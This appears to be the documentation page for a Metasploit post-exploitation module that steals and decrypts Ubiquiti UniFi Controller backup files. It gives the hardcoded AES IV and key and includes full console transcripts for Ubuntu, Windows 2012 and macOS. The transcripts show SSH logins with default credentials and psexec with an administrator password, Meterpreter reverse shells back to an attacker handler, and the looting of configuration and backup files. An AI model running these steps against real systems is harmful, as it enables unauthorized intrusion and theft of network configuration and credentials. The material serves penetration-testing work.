## Vulnerable Application

  This module works against UniFi Network Controller (5.10.19 confirmed, most likely others), to download any backup and
  autobackup files (.unf extension).  These files are AES encrypted zip files which use the IV `ubntenterpriseap` and
  key `bcyangkmluohmars`.  The unf zip file is then decrypted, however it contains an error in the file.  Utilizing
  `zip -FF` the file can be repaired and opened (some reports say 7zip can open the errored file).  If `zip` is
  available on the system, this operation is performed and the result saved to loot as well.

  This work is based on zhangyoufu's [unifi-backup-decrypt](https://github.com/zhangyoufu/unifi-backup-decrypt)
  and justingist's [POSH-Ubiquiti](https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1).  

### Install Instructions

  1. Download the file from https://www.ui.com/download/unifi (Java required on Windows)
  2. Install with default parameters
  3. Login to `https://localhost:8443/manage` and click the gear icon in the bottom left
  4. Select `Maintenance` then click `DOWNLOAD BACKUP` to create the backup file.

## Verification Steps

  1. Install the application
  2. Get a shell
  3. Do: ```use post/multi/gather/ubiquiti_unifi_backup```
  4. Do: ```set session #```
  5. Do: ```run```

## Scenarios

### Ubiquiti Unifi Controller 5.10.19 (Build: atag_5.10.19_11646) on Ubuntu 18.04

#### Initial Access

```
[*] Processing unifi.rb for ERB directives.
resource (unifi.rb)> use auxiliary/scanner/ssh/ssh_login
resource (unifi.rb)> set username unifi
username => unifi
resource (unifi.rb)> set password unifi
password => unifi
resource (unifi.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (unifi.rb)> run
[+] 2.2.2.2:22 - Success: 'unifi:unifi' 'uid=1000(unifi) gid=1000(unifi) groups=1000(unifi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare) Linux unifi 4.18.0-16-generic #17~18.04.1-Ubuntu SMP Tue Feb 12 13:35:51 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:33389 -> 2.2.2.2:22) at 2019-03-10 15:58:18 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (unifi.rb)> sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 1.1.1.1:4433 
[*] Sending stage (985320 bytes) to 2.2.2.2
[*] Meterpreter session 2 opened (1.1.1.1:4433 -> 2.2.2.2:37124) at 2019-03-10 15:58:25 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
```

#### Module

```
resource (unifi.rb)> use post/multi/gather/ubiquiti_unifi_backup
resource (unifi.rb)> set verbose true
verbose => true
resource (unifi.rb)> set session 2
session => 2
resource (unifi.rb)> run

[*] File /var/lib/unifi/system.properties saved to /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
[+] Read UniFi Controller file /var/lib/unifi/system.properties
[-] Directory doesn't exist: /data/autobackup
[+] Found backup folder: /var/lib/unifi/backup
[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip.  File needs to be repair via `zip -FF`
[*] Attempting to repair zip file (this is normal)
[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip.
[*] Post module execution completed
```

#### Details

```
msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000
meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 18.04 (Linux 4.18.0-16-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > background
[*] Backgrounding session 2...
msf5 post(multi/gather/ubiquiti_unifi_backup) > loot

Loot
====

host           service  type                                      name                                                          content          info                                                   path
----           -------  ----                                      ----                                                          -------          ----                                                   ----
2.2.2.2                 ubiquiti.system.properties                /var/lib/unifi/system.properties                              text/plain                                                              /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
2.2.2.2                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
2.2.2.2                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip
2.2.2.2                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip
```

### Ubiquiti Unifi Controller 5.10.19 (Build: atag_5.10.19_11646) on Windows 2012

#### Initial Access

```
[*] Processing unifi.rb for ERB directives.
resource (unifi.rb)> use exploit/windows/smb/psexec
resource (unifi.rb)> set smbpass Password123
smbpass => Password123
resource (unifi.rb)> set smbuser Administrator
smbuser => Administrator
resource (unifi.rb)> set rhosts 4.4.4.4
rhosts => 4.4.4.4
resource (unifi.rb)> run
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] 4.4.4.4:445 - Connecting to the server...
[*] 4.4.4.4:445 - Authenticating to 4.4.4.4:445 as user 'Administrator'...
[*] 4.4.4.4:445 - Selecting PowerShell target
[*] 4.4.4.4:445 - Executing the payload...
[+] 4.4.4.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 4.4.4.4
[*] Meterpreter session 3 opened (1.1.1.1:4444 -> 4.4.4.4:61034) at 2019-03-10 15:58:32 -0400

meterpreter > background
[*] Backgrounding session 3...
```

#### Module

```
resource (unifi.rb)> use post/multi/gather/ubiquiti_unifi_backup
resource (unifi.rb)> set verbose true
verbose => true
resource (unifi.rb)> set session 3
session => 3
resource (unifi.rb)> run
[*] File C:\Users\Administrator\Ubiquiti UniFi\data\system.properties saved to /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt
[+] Read UniFi Controller file C:\Users\Administrator\Ubiquiti UniFi\data\system.properties
[+] Found backup folder: C:\Users\Administrator\Ubiquiti Unifi\data\backup
[+] File C:\Users\Administrator\Ubiquiti Unifi\data\backup/5.10.19.unf saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf
[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip.  File needs to be repair via `zip -FF`
[*] Attempting to repair zip file (this is normal)
[+] File C:\Users\Administrator\Ubiquiti Unifi\data\backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip.
[*] Post module execution completed
[*] Starting persistent handler(s)...
```

#### Details

```
msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-OBKF2JFCDKL
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 3...
msf5 post(multi/gather/ubiquiti_unifi_backup) > loot

Loot
====

host           service  type                                      name                                                          content          info                                                   path
----           -------  ----                                      ----                                                          -------          ----                                                   ----
4.4.4.4                 ubiquiti.system.properties                C:\Users\Administrator\Ubiquiti UniFi\data\system.properties  text/plain                                                              /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt
4.4.4.4                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf
4.4.4.4                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip
4.4.4.4                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip
```

### Ubiquiti Unifi Controller 5.10.20 on OSX 10.14.4

#### Module

```
msf5 post(multi/gather/ubiquiti_unifi_backup) > rexploit
[*] Reloading module...

[+] Read UniFi Controller file /Users/unifi/Library/Application Support/Unifi/data/system.properties
[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_683102.unf
[+] File 5.10.20.unf DECRYPTED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_122303.zip.  File needs to be repair via `zip -FF`
[*] Attempting to repair zip file (this is normal)
[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_728913.zip.
[*] Post module execution completed
```
